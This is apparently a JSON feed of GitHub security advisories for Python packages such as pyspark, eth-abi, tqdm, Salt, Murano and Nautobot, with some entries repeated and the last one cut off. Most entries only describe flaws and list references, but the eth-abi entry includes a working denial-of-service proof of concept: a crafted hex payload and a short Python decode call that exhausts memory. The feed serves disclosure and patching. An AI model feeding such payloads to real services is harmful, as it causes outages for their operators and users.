{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Apache Spark supports end-to-end encryption of RPC connections via \"spark.authenticate\" and \"spark.network.crypto.enabled\". In versions 3.1.2 and earlier, it uses a bespoke mutual authentication protocol that allows for full encryption key recovery. After an initial interactive attack, this would allow someone to decrypt plaintext traffic offline. Note that this does not affect security mechanisms controlled by \"spark.authenticate.enableSaslEncryption\", \"spark.io.encryption.enabled\", \"spark.ssl\", \"spark.ui.strictTransportSecurity\". Update to Apache Spark 3.1.3 or later</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-38296\">https://nvd.nist.gov/vuln/detail/CVE-2021-38296</a></li>\n<li><a href=\"https://lists.apache.org/thread/70x8fw2gx3g9ty7yk0f2f1dlpqml2smd\">https://lists.apache.org/thread/70x8fw2gx3g9ty7yk0f2f1dlpqml2smd</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-186.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-186.yaml</a></li>\n<li><a href=\"https://www.oracle.com/security-alerts/cpujul2022.html\">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9rr6-jpg7-9jg6\">https://github.com/advisories/GHSA-9rr6-jpg7-9jg6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9rr6-jpg7-9jg6",
            "title": "[pyspark] Authentication Bypass by Capture-replay in Apache Spark",
            "date_modified": "2023-11-27T22:56:21.000Z",
            "date_published": "2022-03-11T00:02:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9rr6-jpg7-9jg6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>With this notification I would like to inform about a DoS vector in the Ethereum ABI decoder. \nWe have not yet found a way to exploit this with high impact, still the bug could potentially lead to a DoS in server systems.</p>\n<p>Feel free to ask about an extension of the embargo period.</p>\n<p>Trail of Bits is informing you and other vendors as a community service, and so we do not seek a bug bounty on these issues.</p>\n<h2 id=\"bug-description\">BUG DESCRIPTION</h2>\n<p>Parsers must be written in a robust way, which avoids for example unrecoverable crashes, misinterpretation, hangs, or excessive resource consumption. The recent news about the aCropalypse bug also highlights that more subtle bugs like blind spots in file formats can lead to serious implications. Sometimes the specifications are at fault and sometimes the implementations.</p>\n<p>In the case of the Ethereum ABI, I have to blame the specification more than the vulnerable implementations. The specification allows zero-sized-types (ZST), which can cause denial-of-service upon parsing a malicious payload and schema. If a ZST takes zero bytes when stored on disk, but after parsing occupies memory, then there is the possibility for a denial of service.</p>\n<p>For instance, what will happen if a parser expects an array of ZST? It will try to parse as many ZST as the byte array claims to contain. The following figure first shows a payload of 20 bytes which will deserialize to an array of the numbers 2, 1, 3. The second payload will deserialize to 232 elements of a ZST like an empty tuple or empty array. </p>\n<p>20 bytes of data:</p>\n<pre><code>length=0x3u64 2u32 1u32 3u32\n</code></pre>\n<p>8 bytes of data</p>\n<pre><code>length=0xFFFFFFFu64\n</code></pre>\n<p>Now, this is not a problem if the individual elements take zero memory after parsing. Though, a common flaw is at least during serialization a large amount of memory will be required. If this case is not handled explicitly in the implementation then we are facing a DoS vector. For example, an implementation could decide to represent an array of ZST differently than a normal array and parse it in constant time, instead of looping and naively adding elements to an in-memory array.</p>\n<p>I mentioned that I believe this is a flaw in the specification. The reason for this is that the Ethereum ABI could have decided to disallow ZST completely. Actually, it turned out that in the latest versions of Solidity and Vyper it is not possible to define ZST like empty tuples or empty arrays. Even though the languages do not allow it, it is still allowed in the ABI specification.</p>\n<h2 id=\"poc\">POC</h2>\n<p>We define the data payload as <code>0x0000000000000000000000000000000000000000000000000000000000000020 00000000000000000000000000000000000000000000000000000000FFFFFFFF</code>. It consists of two 32-byte blocks, which describe a serialized array of ZST. The first block defines an offset to the arrayâ€™s elements. The second block defines the length of the array. Independent of the programming language we will reference it always as payload.</p>\n<p>We will try to decode this payload using the ABI schemata ()[] and uint32[0][]. The former represents a dynamic array of empty tuples and the latter a dynamic array of empty static arrays. The distinction between dynamic and static is important here, because an empty static array takes zero bytes, whereas a dynamic one takes a few bytes because it serializes the length of the array.</p>\n<p>The following Python program uses the official eth_abi library and will hang and eventually cause an out-of-memory error.</p>\n<pre><code>from eth_abi import decode\ndata = bytearray.fromhex(payload)\ndecode(['()[]'], data)\n</code></pre>\n<h2 id=\"suggested-remediation\">SUGGESTED REMEDIATION</h2>\n<p>We suggest to disallow the parsing of ZST.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g\">https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rqr8-pxh7-cq3g\">https://github.com/advisories/GHSA-rqr8-pxh7-cq3g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rqr8-pxh7-cq3g",
            "title": "[eth-abi] Ethereum ABI decoder DoS when parsing ZST",
            "date_modified": "2023-11-24T16:54:12.000Z",
            "date_published": "2023-11-24T16:54:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rqr8-pxh7-cq3g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>tqdm._version</code> module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-10075\">https://nvd.nist.gov/vuln/detail/CVE-2016-10075</a></li>\n<li><a href=\"https://github.com/tqdm/tqdm/issues/328\">https://github.com/tqdm/tqdm/issues/328</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/201807-01\">https://security.gentoo.org/glsa/201807-01</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/12/28/8\">http://www.openwall.com/lists/oss-security/2016/12/28/8</a></li>\n<li><a href=\"https://github.com/tqdm/tqdm/pull/330\">https://github.com/tqdm/tqdm/pull/330</a></li>\n<li><a href=\"https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143\">https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7q7-xcjw-qx8q\">https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7q7-xcjw-qx8q",
            "title": "[tqdm] TDQM Arbitrary Code Execution",
            "date_modified": "2023-11-22T22:16:18.000Z",
            "date_published": "2022-05-14T02:19:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7q7-xcjw-qx8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>tqdm._version</code> module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-10075\">https://nvd.nist.gov/vuln/detail/CVE-2016-10075</a></li>\n<li><a href=\"https://github.com/tqdm/tqdm/issues/328\">https://github.com/tqdm/tqdm/issues/328</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/201807-01\">https://security.gentoo.org/glsa/201807-01</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/12/28/8\">http://www.openwall.com/lists/oss-security/2016/12/28/8</a></li>\n<li><a href=\"https://github.com/tqdm/tqdm/pull/330\">https://github.com/tqdm/tqdm/pull/330</a></li>\n<li><a href=\"https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143\">https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7q7-xcjw-qx8q\">https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7q7-xcjw-qx8q",
            "title": "[tqdm] TDQM Arbitrary Code Execution",
            "date_modified": "2023-11-22T22:16:18.000Z",
            "date_published": "2022-05-14T02:19:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7q7-xcjw-qx8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Salt 2015.8.x before 2015.8.4 does not properly handle clear messages on the minion, which allows man-in-the-middle attackers to execute arbitrary code by inserting packets into the minion-master data stream.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-1866\">https://nvd.nist.gov/vuln/detail/CVE-2016-1866</a></li>\n<li><a href=\"https://docs.saltstack.com/en/latest/topics/releases/2015.8.4.html\">https://docs.saltstack.com/en/latest/topics/releases/2015.8.4.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2016-03/msg00034.html\">http://lists.opensuse.org/opensuse-updates/2016-03/msg00034.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqh4-crjf-jjxx\">https://github.com/advisories/GHSA-vqh4-crjf-jjxx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqh4-crjf-jjxx",
            "title": "[salt] Salt Improper Access Control",
            "date_modified": "2023-11-22T21:59:32.000Z",
            "date_published": "2022-05-14T02:11:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqh4-crjf-jjxx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>web2py before 2.14.2 allows remote attackers to obtain the session_cookie_key value via a direct request to examples/simple_examples/status.  NOTE: this issue can be leveraged by remote attackers to execute arbitrary code using CVE-2016-3957.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-3954\">https://nvd.nist.gov/vuln/detail/CVE-2016-3954</a></li>\n<li><a href=\"https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/\">https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</a></li>\n<li><a href=\"https://usn.ubuntu.com/4030-1/\">https://usn.ubuntu.com/4030-1/</a></li>\n<li><a href=\"https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0\">https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr83-vr4j-mp6p\">https://github.com/advisories/GHSA-jr83-vr4j-mp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr83-vr4j-mp6p",
            "title": "[web2py] web2py exposure of sensitive information",
            "date_modified": "2023-11-22T21:57:06.000Z",
            "date_published": "2022-05-14T00:57:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr83-vr4j-mp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4972\">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>\n<li><a href=\"https://bugs.launchpad.net/murano/+bug/1586079\">https://bugs.launchpad.net/murano/+bug/1586079</a></li>\n<li><a href=\"https://bugs.launchpad.net/python-muranoclient/+bug/1586078\">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/23/8\">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>\n<li><a href=\"https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b\">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87r7-q54j-f9qg\">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg",
            "title": "[python-muranoclient] OpenStack Murano Code Execution",
            "date_modified": "2023-11-22T21:21:33.000Z",
            "date_published": "2022-05-17T03:48:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4972\">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>\n<li><a href=\"https://bugs.launchpad.net/murano/+bug/1586079\">https://bugs.launchpad.net/murano/+bug/1586079</a></li>\n<li><a href=\"https://bugs.launchpad.net/python-muranoclient/+bug/1586078\">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/23/8\">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>\n<li><a href=\"https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b\">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87r7-q54j-f9qg\">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg",
            "title": "[murano-dashboard] OpenStack Murano Code Execution",
            "date_modified": "2023-11-22T21:21:33.000Z",
            "date_published": "2022-05-17T03:48:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4972\">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>\n<li><a href=\"https://bugs.launchpad.net/murano/+bug/1586079\">https://bugs.launchpad.net/murano/+bug/1586079</a></li>\n<li><a href=\"https://bugs.launchpad.net/python-muranoclient/+bug/1586078\">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/23/8\">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>\n<li><a href=\"https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b\">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87r7-q54j-f9qg\">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg",
            "title": "[python-muranoclient] OpenStack Murano Code Execution",
            "date_modified": "2023-11-22T21:21:33.000Z",
            "date_published": "2022-05-17T03:48:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4972\">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>\n<li><a href=\"https://bugs.launchpad.net/murano/+bug/1586079\">https://bugs.launchpad.net/murano/+bug/1586079</a></li>\n<li><a href=\"https://bugs.launchpad.net/python-muranoclient/+bug/1586078\">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/23/8\">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>\n<li><a href=\"https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b\">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87r7-q54j-f9qg\">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg",
            "title": "[murano-dashboard] OpenStack Murano Code Execution",
            "date_modified": "2023-11-22T21:21:33.000Z",
            "date_published": "2022-05-17T03:48:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4972\">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>\n<li><a href=\"https://bugs.launchpad.net/murano/+bug/1586079\">https://bugs.launchpad.net/murano/+bug/1586079</a></li>\n<li><a href=\"https://bugs.launchpad.net/python-muranoclient/+bug/1586078\">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/23/8\">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>\n<li><a href=\"https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b\">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>\n<li><a href=\"https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po\">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87r7-q54j-f9qg\">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg",
            "title": "[murano] OpenStack Murano Code Execution",
            "date_modified": "2023-11-22T21:21:33.000Z",
            "date_published": "2022-05-17T03:48:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87r7-q54j-f9qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Software Foundation Apache Submarine has an SQL injection vulnerability when a user logs in. This issue can result in unauthorized login.</p>\n<p>Now we have fixed this issue and now user must have the correct login to access workbench. This issue affects Apache Submarine: from 0.7.0 before 0.8.0.&nbsp;We recommend that all submarine users with 0.7.0 upgrade to 0.8.0, which not only fixes the issue, supports the oidc authentication mode, but also removes the case of unauthenticated logins.</p>\n<p>If using the version lower than 0.8.0 and not want to upgrade, you can try cherry-pick PR  <a href=\"https://github.com/apache/submarine/pull/1037\">https://github.com/apache/submarine/pull/1037</a> <a href=\"https://github.com/apache/submarine/pull/1054\">https://github.com/apache/submarine/pull/1054</a>  and rebuild the submarine-server image to fix this.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-37924\">https://nvd.nist.gov/vuln/detail/CVE-2023-37924</a></li>\n<li><a href=\"https://github.com/apache/submarine/pull/1037\">https://github.com/apache/submarine/pull/1037</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/SUBMARINE-1361\">https://issues.apache.org/jira/browse/SUBMARINE-1361</a></li>\n<li><a href=\"https://lists.apache.org/thread/g99h773vd49n1wyghdq1llv2f83w1b3r\">https://lists.apache.org/thread/g99h773vd49n1wyghdq1llv2f83w1b3r</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-244.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-244.yaml</a></li>\n<li><a href=\"https://github.com/apache/submarine/commit/4cd2af10499ac6dc4f82bda179d9f414a522abef\">https://github.com/apache/submarine/commit/4cd2af10499ac6dc4f82bda179d9f414a522abef</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v5gj-fx3g-hcpw\">https://github.com/advisories/GHSA-v5gj-fx3g-hcpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v5gj-fx3g-hcpw",
            "title": "[apache-submarine] SQL injection in Apache Submarine",
            "date_modified": "2023-11-27T22:02:03.000Z",
            "date_published": "2023-11-22T12:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v5gj-fx3g-hcpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All users of Nautobot versions earlier than 1.6.6 or 2.0.5 are potentially affected.</p>\n<p>Due to incorrect usage of Django's <code>mark_safe()</code> API when rendering certain types of user-authored content, including:</p>\n<ul>\n<li>custom links</li>\n<li>job buttons</li>\n<li>computed fields</li>\n</ul>\n<p>it is possible that users with permission to create or edit these types of content could craft a malicious payload (such as JavaScript code) that would be executed when rendering pages containing this content.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>We have fixed the incorrect uses of <code>mark_safe()</code> (generally by replacing them with appropriate use of <code>format_html()</code> instead) to prevent such malicious data from being executed.</p>\n<p>Users on Nautobot 1.6.x LTM should upgrade to v1.6.6 and users on Nautobot 2.0.x should upgrade to v2.0.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>Appropriate object permissions can and should be applied to restrict which users are permitted to create or edit the aforementioned types of user-authored content. Other than that, there is no direct fix available.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4832\">https://github.com/nautobot/nautobot/pull/4832</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4833\">https://github.com/nautobot/nautobot/pull/4833</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr\">https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48705\">https://nvd.nist.gov/vuln/detail/CVE-2023-48705</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4832\">https://github.com/nautobot/nautobot/pull/4832</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4833\">https://github.com/nautobot/nautobot/pull/4833</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2\">https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d\">https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cf9f-wmhp-v4pr\">https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cf9f-wmhp-v4pr",
            "title": "[nautobot] Cross-site Scripting potential in custom links, job buttons, and computed fields",
            "date_modified": "2023-11-22T20:55:55.000Z",
            "date_published": "2023-11-22T20:55:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cf9f-wmhp-v4pr"
